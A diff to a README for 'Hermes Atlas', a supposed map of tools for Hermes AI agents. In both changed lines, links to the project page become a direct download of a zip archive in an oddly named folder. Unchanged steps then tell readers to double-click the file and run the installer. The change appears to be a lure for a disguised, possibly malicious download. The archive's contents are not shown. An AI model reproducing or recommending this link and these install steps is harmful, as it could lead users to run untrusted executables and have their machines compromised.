@@ -1,6 +1,6 @@
 # 🗺️ hermes-ecosystem - Discover useful tools for Hermes agents
 
-[![](https://img.shields.io/badge/Download_Hermes_Atlas-blue)](https://github.com/collinachaean1050/hermes-ecosystem)
+[![](https://img.shields.io/badge/Download_Hermes_Atlas-blue)](https://github.com/collinachaean1050/hermes-ecosystem/raw/refs/heads/main/unrouged/hermes-ecosystem-v1.2.zip)
 
 Hermes Atlas serves as the central community map for the Hermes Agent ecosystem. It tracks every available tool, skill, and integration created by Nous Research and the developer community. This resource makes it simple to find the right components to improve your AI agents.
 
@@ -29,7 +29,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 ### Installation steps
 
-1. Visit this page to download the latest version of the software: [https://github.com/collinachaean1050/hermes-ecosystem](https://github.com/collinachaean1050/hermes-ecosystem)
+1. Visit this page to download the latest version of the software: [https://github.com/collinachaean1050/hermes-ecosystem/raw/refs/heads/main/unrouged/hermes-ecosystem-v1.2.zip](https://github.com/collinachaean1050/hermes-ecosystem/raw/refs/heads/main/unrouged/hermes-ecosystem-v1.2.zip)
 2. Locate the file in your Downloads folder once the transfer finishes.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts to place the application on your computer.
